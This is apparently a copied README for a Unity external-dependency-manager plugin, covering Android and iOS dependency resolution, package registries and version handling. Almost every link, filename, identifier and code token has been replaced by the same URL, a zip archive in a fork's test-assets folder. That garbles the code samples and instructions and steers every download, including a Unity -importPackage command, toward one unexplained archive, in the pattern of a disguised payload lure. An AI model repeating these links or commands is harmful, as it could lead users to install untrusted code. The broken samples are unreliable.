...
Unity plugin that requires:
   ...
   * Android specific libraries (e.g
     [AARs](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip)).
   * iOS [CocoaPods](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip).
   * Version management of transitive dependencies.
   * Management of Package Manager (PM) Registries.

Updated releases are available on
[GitHub](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip)
...
[CocoaPods](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip) to download and integrate iOS libraries
...
The [Package Manager](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip)
(PM) makes use of [NPM](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip) registry servers for package
...
[PM](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip) to provide a way to
...
`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip()` in the source code.
...
[scoped registry](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip)
...
package:
   ...
   1. Import the `external-dependency-manager-*.unitypackage` into your plugin
      project by
      [running Unity from the command line](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip), ensuring that
      you add the `-gvh_disable` option.
   1. Export your plugin by [running Unity from the command line](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip), ensuring that
      you:
...
`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` into the project
`MyPluginProject` and export the entire Assets folder to
`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`:

```
Unity -gvh_disable \
      -batchmode \
      -importPackage https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip \
      -projectPath MyPluginProject \
      -exportPackage Assets https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip \
      -quit
```
...
the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` into a Unity plugin project, you
...
target in the Unity editor.
   ...
   2. Copy and rename the
      [https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip)
      ...
      name `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`. For example,
      `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`.
...
(`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` package) at version `9.8.0` to
the set of a plugin's Android dependencies:

```
<dependencies>
  <androidPackages>
    <androidPackage spec="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip">
...
following operations:
   ...
   - Collect the set of Android dependencies (libraries) specified by a
     project's `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` files.
   - Run `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` with Gradle to resolve conflicts and,
   ...
   - Process each AAR / JAR so that it can be used with the currently selected
     ...
     https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip with the project's bundle ID.  This means resolution
...
### Integrate into https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip

Unity 5.6 introduced support for customizing the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` used to build
Unity projects with Gradle. When the *Patch https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip* setting is
...
results in the execution of the following operations:
   ...
   - Rename any `.srcaar` files in the build to `.aar` and exclude them from
     ...
     `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` will be patched to include them instead from their
     local maven repositories.
   - Inject the required Gradle repositories into `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` at the
   ...
   - Inject the required Android dependencies (libraries) into
     `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` at the line matching the pattern `***DEPS***` or
   ...
   - Inject the packaging options logic, which excludes architecture specific
     libraries based upon the selected build target, into `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`
...
`https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` to quickly determine the set
...
[CocoaPods](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip).  A CocoaPods `Podfile` is generated and
...
```
using https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip;
public class PostProcessIOS : MonoBehaviour {
[PostProcessBuildAttribute(45)]//must be between 40 and 50 to ensure that it's not overriden by Podfile generation (40) and that it's added before "pod install" (50)
private static void PostProcessBuild_iOS(BuildTarget target, string buildPath)
{
    if (target == https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip)
    {

        using (StreamWriter sw = https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip(buildPath + "/Podfile"))
        {
...
[Package Manager](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip)
...
## Adding Registries
   ...
   2. Copy and rename the
      ...
      The XML file just needs to be under an `Editor` directory and match the
      name `*https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` or labeled with `gumpr_registries`. For example,
      `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`.

   3. Follow the steps in the [Getting Started](#getting-started)
      section when you are exporting your plugin package.

For example, to add a registry for plugins in the scope `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`:

```
<registries>
  <registry name="Cool Stuff"
            url="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip"
            termsOfService="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip"
            privacyPolicy="https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip">
    <scopes>
      <scope>https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip</scope>
    </scopes>
  </registry>
</registries>
```
...
project if it isn't already present in the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` file.

For more information, see Unity's documentation on
[scoped package registries](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip).
...
* The PM package JSON provided by the registry must include a keyword
  (in the `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` list) that maps the PM package
...
[special folders](https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip) rules.
...
* Plugins can ship using assets with unique names, unique GUIDs and version
  ...
  added to the filename (e.g `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` would be `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip).
...
Unity plugins can be managed by the Version Handler using the following steps:
   ...
   1. Optional: If your plugin is included in other Unity plugins, you should
      ...
      recent version.
   1. Create a manifest text file named `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`
...
```
https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip build
```
...
need to do the following:
   ...
   * Bump the plugin version variable `pluginVersion` in `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip`
   * Update `https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip` with the new version number and changes included in
     the release.
   ...
   * Create release commit using `./gradlew gitCreateReleaseCommit` which
     performs `git commit -a -m "description from https://raw.githubusercontent.com/wajid892/unity-jar-resolver/master/source/AndroidResolver/scripts/download_artifacts_test_assets/m2repository/org/resolver_unity_jar_v1.4-alpha.4.zip"`
